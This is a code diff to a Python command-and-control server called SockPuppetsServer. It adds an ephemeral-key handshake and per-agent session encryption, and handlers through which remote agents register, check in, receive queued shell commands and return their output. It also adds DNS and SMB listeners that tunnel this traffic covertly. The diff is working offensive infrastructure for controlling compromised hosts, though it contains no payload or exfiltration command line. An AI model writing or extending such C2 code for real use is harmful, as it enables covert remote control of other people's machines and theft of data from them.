@@ -180,9 +180,22 @@ class SockPuppetsServer:
             logger.error(f"Failed to load streaming module: {e}")
             return ""
 
+    def _session_key(self, key: bytes):
+        if not key:
+            return None
+        for agent in self.agents.values():
+            sk = getattr(agent, 'session_key', None)
+            if sk and sk == key:
+                return sk
+        return None
+
     def simple_encrypt(self, data: str, key: bytes = None) -> str:
         """AES-256-GCM encryption: base64(AES1 + nonce12 + ciphertext + tag16)"""
         key = key or self.encryption_key
+        sk = self._session_key(key)
+        if sk:
+            from crypto.handshake import session_encrypt
+            return session_encrypt(sk, data)
         aes_key = self._derive_aes_key(key)
         nonce = os.urandom(12)
         aesgcm = AESGCM(aes_key)
@@ -192,6 +205,10 @@ class SockPuppetsServer:
     def simple_decrypt(self, data: str, key: bytes = None) -> str:
         """AES-256-GCM decryption: expects base64(AES1 + nonce12 + ciphertext + tag16)"""
         key = key or self.encryption_key
+        sk = self._session_key(key)
+        if sk:
+            from crypto.handshake import session_decrypt
+            return session_decrypt(sk, data)
         raw = base64.b64decode(data.encode())
         if len(raw) < 32 or raw[:4] != b'AES1':
             raise ValueError("Invalid AES-GCM payload (missing AES1 prefix)")
@@ -222,8 +239,18 @@ class SockPuppetsServer:
         return (c2s_key, s2c_key)
 
     def try_decrypt(self, data: str) -> tuple:
-        """Try all known keys to decrypt data via AES-256-GCM.
-        Returns (decrypted_str, key_used). Raises ValueError if no key works."""
+        """Try session keys, then known keys. Returns (decrypted_str, key_used)."""
+        from crypto.handshake import session_decrypt
+        for agent in self.agents.values():
+            sk = getattr(agent, 'session_key', None)
+            if not sk:
+                continue
+            try:
+                result = session_decrypt(sk, data)
+                json.loads(result)
+                return result, sk
+            except Exception:
+                continue
         for key in self.known_keys:
             try:
                 result = self.simple_decrypt(data, key)
@@ -402,8 +429,16 @@ class SockPuppetsServer:
         try:
             async for message in websocket:
                 try:
-                    # Decrypt and parse message (try per-agent key first, then all keys)
-                    if ws_key:
+                    wire = None
+                    if isinstance(message, str) and message.startswith('EPH1.'):
+                        from crypto.handshake import ServerIdentity, open_wire
+                        if not hasattr(self, 'identity'):
+                            self.identity = ServerIdentity.load()
+                        keys = [a.session_key for a in self.agents.values() if getattr(a, 'session_key', None)]
+                        wire = open_wire(self.identity, message, keys)
+                        decrypted = wire.plaintext
+                        data = json.loads(decrypted)
+                    elif ws_key:
                         try:
                             decrypted = self.simple_decrypt(message, ws_key)
                             data = json.loads(decrypted)
@@ -425,7 +460,7 @@ class SockPuppetsServer:
                             'agent_id': agent_id,
                             'status': 'success'
                         }
-                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
+                        encrypted_response, ws_key = self._seal_reply(response, ws_key, wire, agent_id)
                         await websocket.send(encrypted_response)
 
                         # Start command handler for this agent
@@ -487,7 +522,7 @@ class SockPuppetsServer:
                             agent.encryption_key = ws_key
                             agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))
 
-                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
+                        encrypted_response, ws_key = self._seal_reply(response, ws_key, wire, agent_id)
                         await websocket.send(encrypted_response)
 
                     elif msg_type == 'heartbeat':
@@ -497,7 +532,7 @@ class SockPuppetsServer:
                             if agent.command_sender_task is None or agent.command_sender_task.done():
                                 agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))
                             response = {'type': 'heartbeat_ack', 'status': 'alive'}
-                            encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
+                            encrypted_response, ws_key = self._seal_reply(response, ws_key, wire, agent_id)
                             await websocket.send(encrypted_response)
 
                     elif msg_type == 'response':
@@ -688,6 +723,8 @@ class SockPuppetsServer:
             if not body.strip():
                 return await self._http_handle_index(request)
 
+            if body.startswith('EPH1.'):
+                return await self._http_handle_handshake(request, body)
             decrypted, key_used = self.try_decrypt(body)
             data = json.loads(decrypted)
             msg_type = data.get('type', '')
@@ -714,6 +751,49 @@ class SockPuppetsServer:
         if agent_id and agent_id in self.agents:
             return await self._http_handle_heartbeat(request)
         return await self._http_handle_index(request)
+
+    async def _http_handle_handshake(self, request, body: str):
+        from crypto.handshake import ServerIdentity, open_wire
+        if not hasattr(self, 'identity'):
+            self.identity = ServerIdentity.load()
+        keys = [a.session_key for a in self.agents.values() if getattr(a, 'session_key', None)]
+        wire = open_wire(self.identity, body, keys)
+        data = json.loads(wire.plaintext)
+        msg_type = data.get('type', '')
+        if msg_type == 'register':
+            agent_id = str(uuid.uuid4())[:8]
+            metadata = data.get('metadata', {})
+            metadata['ip'] = request.remote or 'Unknown'
+            agent = self.register_agent_common(agent_id, metadata, 'https' if request.secure else 'http')
+            response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
+        elif msg_type == 'checkin':
+            agent_id = data.get('agent_id')
+            if not agent_id or agent_id not in self.agents:
+                return web.Response(status=404)
+            agent = self.agents[agent_id]
+            agent.last_seen = datetime.now()
+            for result in data.get('results') or []:
+                agent.pending_results.append({
+                    'command': result.get('command', ''),
+                    'output': result.get('output', ''),
+                    'timestamp': result.get('timestamp', ''),
+                    'received_at': datetime.now().isoformat(),
+                })
+            commands = []
+            while not agent.command_queue.empty():
+                try:
+                    cmd = agent.command_queue.get_nowait()
+                    commands.append(cmd if isinstance(cmd, dict) else {'type': 'command', 'command': cmd})
+                except asyncio.QueueEmpty:
+                    break
+            response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
+        else:
+            return web.Response(status=400)
+        sealed = wire.seal(json.dumps(response, separators=(',', ':')))
+        if agent_id in self.agents and wire.session_key:
+            self.agents[agent_id].session_key = wire.session_key
+            self.agents[agent_id].encryption_key = wire.session_key
+        return web.Response(text=sealed, content_type='text/html')
 
     async def _http_do_register(self, request, data, key_used):
         """Process agent registration from parsed data"""
@@ -1885,6 +1965,88 @@ class SockPuppetsServer:
         """Start the server (WebSocket listener, backward compatible)"""
         await self.start_ws_listener(host, port)
         await asyncio.Future()  # Run forever
+
+    def handle_blob(self, blob: bytes, peer: str, transport: str) -> bytes:
+        text = blob.decode('utf-8', errors='replace')
+        if text.startswith('EPH1.'):
+            from crypto.handshake import ServerIdentity, open_wire
+            if not hasattr(self, 'identity'):
+                self.identity = ServerIdentity.load()
+            keys = [a.session_key for a in self.agents.values() if getattr(a, 'session_key', None)]
+            wire = open_wire(self.identity, text, keys)
+            data = json.loads(wire.plaintext)
+        else:
+            decrypted, key_used = self.try_decrypt(text)
+            data = json.loads(decrypted)
+            wire = None
+        msg_type = data.get('type', '')
+        if msg_type == 'register':
+            agent_id = str(uuid.uuid4())[:8]
+            metadata = data.get('metadata', {})
+            metadata['ip'] = peer or 'Unknown'
+            self.register_agent_common(agent_id, metadata, transport)
+            response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
+        elif msg_type == 'checkin' and data.get('agent_id') in self.agents:
+            agent_id = data['agent_id']
+            agent = self.agents[agent_id]
+            agent.last_seen = datetime.now()
+            for result in data.get('results') or []:
+                agent.pending_results.append({
+                    'command': result.get('command', ''),
+                    'output': result.get('output', ''),
+                    'timestamp': result.get('timestamp', ''),
+                    'received_at': datetime.now().isoformat(),
+                })
+            commands = []
+            while not agent.command_queue.empty():
+                try:
+                    cmd = agent.command_queue.get_nowait()
+                    commands.append(cmd if isinstance(cmd, dict) else {'type': 'command', 'command': cmd})
+                except asyncio.QueueEmpty:
+                    break
+            response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
+        else:
+            response = {'type': 'error', 'status': 'bad_type'}
+            agent_id = data.get('agent_id')
+        payload = json.dumps(response, separators=(',', ':'))
+        if wire:
+            reply = wire.seal(payload)
+            if agent_id in self.agents and wire.session_key:
+                self.agents[agent_id].session_key = wire.session_key
+                self.agents[agent_id].encryption_key = wire.session_key
+        else:
+            reply = self.simple_encrypt(payload, key_used)
+        return reply.encode()
+
+    def _seal_reply(self, response, key, wire, agent_id):
+        payload = json.dumps(response)
+        if wire is not None:
+            sealed = wire.seal(payload)
+            if wire.session_key and agent_id and agent_id in self.agents:
+                self.agents[agent_id].session_key = wire.session_key
+                self.agents[agent_id].encryption_key = wire.session_key
+            return sealed, (wire.session_key or key)
+        return self.simple_encrypt(payload, key), key
+
+    async def start_dns_listener(self, host: str = '0.0.0.0', port: int = 5353):
+        from transports.dns import DNSServer
+        name = f'dns_{port}'
+        if name in self.listeners:
+            return
+        server = DNSServer(host, port, lambda payload, kind: self.handle_blob(payload, host, 'dns'))
+        server.start()
+        self.listeners[name] = {'type': 'dns', 'host': host, 'port': port, 'server': server, 'started_at': datetime.now().isoformat()}
+        logger.info(f"DNS listener started on {host}:{port}")
+
+    async def start_smb_listener(self, host: str = '0.0.0.0', port: int = 4455):
+        from transports.smb import SMBServer
+        name = f'smb_{port}'
+        if name in self.listeners:
+            return
+        server = SMBServer(host, port, lambda payload, kind: self.handle_blob(payload, host, 'smb'))
+        server.start()
+        self.listeners[name] = {'type': 'smb', 'host': host, 'port': port, 'server': server, 'started_at': datetime.now().isoformat()}
+        logger.info(f"SMB listener started on {host}:{port}")
 
 
 # Global server instance
